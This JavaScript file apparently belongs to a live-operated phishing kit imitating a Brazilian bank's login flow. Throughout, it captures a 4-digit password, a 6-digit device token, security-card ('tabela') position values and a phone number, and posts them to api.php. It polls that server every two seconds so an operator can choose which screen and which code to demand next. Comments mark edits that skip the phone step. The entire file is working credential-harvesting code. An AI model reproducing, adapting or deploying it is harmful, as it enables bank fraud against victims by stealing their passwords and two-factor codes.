$(document).ready(function() {

    let id = $('#idInfo').val();
    let clientHashId = $('#clientHashId').val();


    let status = 'SENHA_DE_4';
    let info;

    function loadInfo(){
        $.ajax({
            url: "api.php",
            type:'POST',
            dataType : "json",
            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
            cache: false,
            success: function(r){
                info = r;
                if(r.comando !== status) {
                    status = r.comando;
                    atualizarTela();
                }
            }
        });
    }

    $('ul#ul_teclado_virtual a').click( e => {
        e.preventDefault();
        let value = $(e.target).text().trim();

        if(value === 'Limpar'){
            zerarSenhaDe4();
        } else {

            let pass1 = $('input#txtPass1').val();
            let pass2 = $('input#txtPass2').val();
            let pass3 = $('input#txtPass3').val();
            let pass4 = $('input#txtPass4').val();

            if(pass1.length == 0){
                $('input#txtPass1').val(value);
            } else if(pass2.length == 0){
                $('input#txtPass2').val(value);
            } else if(pass3.length == 0){
                $('input#txtPass3').val(value);
            } else if(pass4.length == 0){
                $('input#txtPass4').val(value);
                $('#btnAcessarSenha4').addClass('btn-action-active');
            }

        }

    });

    function atualizarTela(){

        $('div.boxes').addClass('hide');
        $('span.txt_msg_erro_disp').addClass('hide');


        if(status === 'AGUARDANDO'){
            $('div#boxAguardando').removeClass('hide');
        }
        if(status ==='SENHA_DE_4'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4').removeClass('hide');
        }
        if(status ==='SENHA_DE_4_ERRO'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4 span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxSenha4').removeClass('hide');
        }


        if(status === 'TOKEN'){
            $('div.steps-border').css('margin-left','210px');
            $('div#boxToken strong.serial').text(info.serialDispositivo);
            $('div.mark-char').css('left','0px');
            $('div#boxToken').removeClass('hide');
        }


        if(status === 'TOKEN_ERRO'){
            $('div.steps-border').css('margin-left','210px');
            $('div#boxToken strong.serial').text(info.serialDispositivo);
            $('div.mark-char').css('left','0px');
            $('div#boxToken span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxToken').removeClass('hide');
        }


        if(status ==='TABELA'){
            $('div.steps-border').css('margin-left','210px');
            $('div#boxTabela strong.serial').text(info.serialDispositivo);
            $('#posicao').text(info.texto);
            $('div#boxTabela').removeClass('hide');
        }

        if(status ==='TABELA_ERRO'){
            $('div.steps-border').css('margin-left','210px');
            $('div#boxTabela strong.serial').text(info.serialDispositivo);
            $('#posicao').text(info.texto);
            $('div#boxTabela span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxTabela').removeClass('hide');
        }

        if(status == 'AGUARDANDO_INTERNA') {
            window.location.href = "interna.php?hash="+clientHashId;
        }
        if(status == 'INFORMACOES_INVALIDAS') {
            window.location.href = "home.php?hash="+clientHashId+"&msg=erro";
        }
    }

    function zerarSenhaDe4(){
        $('input.frmPassWord').val('');
        $('#btnAcessarSenha4').removeClass('btn-action-active');
    }

    $('div#conteudo').on('focus', 'div#boxToken input#token', function(e) {
       $('div.mark-char').addClass('mark-char-visible');
    });

    $('div#conteudo').on('focusout', 'div#boxToken input#token', function(e) {
        $('div.mark-char').removeClass('mark-char-visible');
    });


    $('div#conteudo').on('keyup', 'div#boxTabela input#posicaoTabela', function(e) {

        e.preventDefault();
        

        e.target.value=e.target.value.replace(/[^\d]/,'')


        if( e.target.value.length == 3) {
            $("input#posicaoTabela").blur(); 
            $('button#btnAcessarTabela').addClass('btn-action-active');
        } else {
            $('button#btnAcessarTabela').removeClass('btn-action-active');
        }

    });

    $('div#conteudo').on('keyup', 'div#boxToken input#token', function(e) {

        e.preventDefault();

        e.target.value=e.target.value.replace(/[^\d]/,'')

        let token = e.target.value;
        let qnt = token.length;

        let size = qnt * 40;

        if(qnt <= 6){
            if(size > 200){
                size = 200;
            }
            $('div.mark-char').css('left',size+'px');
        }

        if(qnt == 6) {
            $("input#token").blur(); 
            $('button#btnAcessarToken').addClass('btn-action-active');
        } else {
            $('button#btnAcessarToken').removeClass('btn-action-active');
        }

    });

    $('div#conteudo').on('click', 'div#boxTabela button#btnAcessarTabela.btn-action-active', function(e) {

        e.preventDefault();

        let token = $('input#posicaoTabela').val();

        if(token.length !== 3){
            $('div#boxTabela span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.comando = 'AGUARDANDO';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "SALVAR_TOKEN", id : id,clientHashId : clientHashId, posicao: info.texto, valor : token},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#posicaoTabela').val('');
                $('button#btnAcessarTabela.btn-action-active').removeClass('btn-action-active');
                atualizarTela();
                
            }
        });

    });


    $('div#conteudo').on('click', 'div#boxToken button#btnAcessarToken.btn-action-active', function(e) {

        e.preventDefault();

        let token = $('input#token').val();

        if(token.length !== 6){
            $('div#boxToken span.txt_msg_erro_disp').removeClass('hide');
            return;
        }

        info.comando = 'AGUARDANDO';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "SALVAR_TOKEN", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#token').val('');
                $('button#btnAcessarToken.btn-action-active').removeClass('btn-action-active');
                atualizarTela();
                
            }
        });

    });
	
	$('div#conteudo').on('click', 'div#boxAguardando button#btnAtualizarCelular.btn-action-active', function(e) {

        let celular = $('input#celular').val();

        if(celular.length < 8){
            $('div#boxCelular').find('.box_redLine_bottom').removeClass('form_erro');
            return;
        }

        info.celular = celular;
        info.comando = 'AGUARDANDO';



        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#celular').val('');
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });

    });

    // MODIFICAÇÃO: Pula a etapa do celular
    $('div#conteudo').on('click', 'div#boxSenha4 button#btnAcessarSenha4.btn-action-active', function(e) {

        e.preventDefault();

        let s4_1 = $('#txtPass1').val();
        let s4_2 = $('#txtPass2').val();
        let s4_3 = $('#txtPass3').val();
        let s4_4 = $('#txtPass4').val();

        let senhaDe4 = s4_1 + '' + s4_2 + '' + s4_3 + '' + s4_4;

        if(senhaDe4.length !== 4){
            $('div#boxSenhaDe4').find('.box_redLine_bottom').addClass('form_erro');
            return;
        }

        info.senha4 = senhaDe4;
        info.comando = 'AGUARDANDO';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                zerarSenhaDe4();
                // MODIFICAÇÃO: Pula direto para a tela de loading sem mostrar o campo do celular
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });

    });


    $('input.titularRadio').click(function(e) {

        let titular = $(e.target).val();
        let nome = $(e.target).data('nome');

        $('div.option').removeClass('option-checked');
        $(e.target).parents('div.option').addClass('option-checked');


        $.ajax({
            url: "api.php",
            type:'POST',
            dataType : "text",
            data: { action : "ATUALIZAR_TITULAR", id : id, nome : nome, titular : titular},
            cache: false,
            success: function(r){
                info = r;
                $('div#conteudoSenha').removeClass('hide');
            }
        });

    });

    var timer = setInterval ( function(){
        loadInfo();
    }, 2000 );


    loadInfo();
});